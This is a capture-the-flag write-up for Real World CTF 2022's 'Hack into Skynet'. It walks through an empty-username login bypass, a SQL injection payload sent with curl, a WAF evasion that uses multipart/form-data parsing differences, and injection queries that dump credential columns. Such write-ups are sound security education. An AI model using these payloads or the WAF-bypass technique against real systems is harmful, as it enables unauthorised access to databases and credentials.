![](https://realworldctf.com/static/img/homecenter.58f5025.png)

I haven't joined in CTF for about 3 months. Then this weekend I got an interesting challenge from Real World CTF. The Hack into Skynet challenge is to bypass the detection mechanism and trigger sql injection. However, this mechanism could not be easily bypassed

![](https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/1.png?raw=true)
There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.

```python
def query_login_attempt():
    username = flask.request.form.get('username', '')
    password = flask.request.form.get('password', '')
    if not username and not password:
        return False

    sql = ("SELECT id, account"
           "  FROM target_credentials"
           "  WHERE password = '{}'").format(hashlib.md5(password.encode()).hexdigest())
    user = sql_exec(sql)
    name = user[0][1] if user and user[0] and user[0][1] else ''
    return name == username
```
I've found some stupid logic in the code of the login logic. If the user variable is an empty value, the empty value of the name variable is put in, and finally the value of the name variable and the username variable is compared. Here, if the name variable and the username variable are both empty values, true is returned, so the login can be successful.

![](https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/2.png?raw=true)
As expected, the login was successful when the username value was passed as an empty value. Now that the login was successful, the search logic can be used.

```python
def query_kill_time():
    name = flask.request.form.get('name', '')
    if not name:
        return None

    sql = ("SELECT name, born"
           "  FROM target"
           "  WHERE age > 0"
           "    AND name = '{}'").format(name)
    nb = sql_exec(sql)
    if not nb:
        return None
    return '{}: {}'.format(*nb[0])
```
SQL injection occurs because the value of name in the query_kill_time() function is passed as it is to the query.

```bash
root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d "name='or 1=1 --"
HTTP/1.0 403 FORBIDDEN
Content-Type: text/html
Content-Length: 234
Server: Werkzeug/0.16.1 Python/3.8.10
Date: Thu, 27 Jan 2022 08:15:34 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```
When attempting sql injection, it was found that the detection mechanism was controlled.

```python
(...)

def skynet_detect():
    req = {
        'method': flask.request.method,
        'path': flask.request.full_path,
        'host': flask.request.headers.get('host'),
        'content_type': flask.request.headers.get('content-type'),
        'useragent': flask.request.headers.get('user-agent'),
        'referer': flask.request.headers.get('referer'),
        'cookie': flask.request.headers.get('cookie'),
        'body': str(flask.request.get_data()),
    }
    _, result = skynet.classify(req)
    return result and result['attack']

(...)

@app.route('/', methods=['GET', 'POST'])
def do_query():
    if skynet_detect():
        return flask.abort(403)

    if not query_login_state():
        response = flask.make_response('No login, redirecting', 302)
        response.location = flask.escape('/login')
        return response

    if flask.request.method == 'GET':
        return flask.send_from_directory('', 'index.html')
    elif flask.request.method == 'POST':
        kt = query_kill_time()
        if kt:
            result = kt 
        else:
            result = ''
        return flask.render_template('index.html', result=result)
    else:
        return flask.abort(400)
```
The reason is that the skynet_detect() function was being called before the query_kill_time() function was called. Here again the code was written with very stupid logic.

```txt
skynet_detect()   : flask.request.get_data()
query_kill_time() : flask.request.form.get()
```
In the skynet_detect() function, the get_data() method was used, and in the query_kill_time() function, the form.get() method was used, and the body value was used. Why use it differently? I got a lot of doubts here, and I thought this would be important in solving the challenge.

```bash
root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d "name='or 1=1 --" -H "Content-Type: application/json"
HTTP/1.0 403 FORBIDDEN
Content-Type: text/html
Content-Length: 234
Server: Werkzeug/0.16.1 Python/3.8.10
Date: Thu, 27 Jan 2022 08:22:35 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d "name='or 1=1 --" -H "Content-Type: application/xml"
HTTP/1.0 403 FORBIDDEN
Content-Type: text/html
Content-Length: 234
Server: Werkzeug/0.16.1 Python/3.8.10
Date: Thu, 27 Jan 2022 08:22:39 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```
So, while changing the value of `Content-Type` as above, I tried to bypass the detection mechanism by using the difference in parsing between the two functions. but no response. However, the important thing is that I did not use the file upload function using Multipart/form-data. When a file is uploaded, not only the file name and contents, but also various values exist as binary data. So I thought that if I tried using these functions, the values could be mixed and bypassed.

![](https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/3.png?raw=true)
As expected, it was strangely detoured.

```sql
select string_agg(column_name, ','),null from information_schema.columns where table_name='target_credentials' --
==> -- id,account,password,access_key,secret_key: None

select string_agg(secret_key, ','),'f' from target_credentials --
==> -- rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n},92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937: f
```

> FLAG : rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}

---
